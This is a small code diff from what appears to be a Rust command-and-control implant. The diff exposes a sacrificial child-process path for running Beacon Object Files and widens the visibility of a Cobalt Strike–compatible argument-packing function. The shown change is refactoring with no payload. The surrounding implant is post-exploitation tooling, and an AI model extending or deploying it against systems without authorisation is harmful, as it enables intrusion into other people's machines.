@@ -34,6 +34,11 @@ use nyx_protocol::Response;
 // `vec!` macro re-export lives in nyx_implant_core::heap; the bare `vec` import below is
 // unused (we use the Vec type directly), so don't pull it in.
 
+// B3: re-export the isolated (sacrificial child-process) BOF path so
+// `crate::bof::bof_isolated` is the single entry point both beacon dispatch
+// and the selftests use; the inline loader below stays the default mode.
+pub use crate::bof_isolated::bof_isolated;
+
 // ---- Win32 constants ----
 
 const MEM_COMMIT: u32 = 0x1000;
@@ -937,7 +942,9 @@ unsafe fn RtlZeroMemory(ptr: *mut c_void, len: usize) {
 ///
 /// CS packs each arg as: `[u32 tag][u32 length][bytes]` (BEACON_ARG_TYPE_STRING
 /// = 3). We use that layout so community BOFs that parse args work unchanged.
-fn pack_args(args: &[String]) -> Vec<u8> {
+/// `pub(crate)`: the B3 isolated path (`bof_isolated.rs`) reuses this packing
+/// verbatim for its child-process payload.
+pub(crate) fn pack_args(args: &[String]) -> Vec<u8> {
     let mut out = Vec::new();
     for a in args {
         out.extend_from_slice(&3u32.to_le_bytes()); // BEACON_ARG_TYPE_STRING
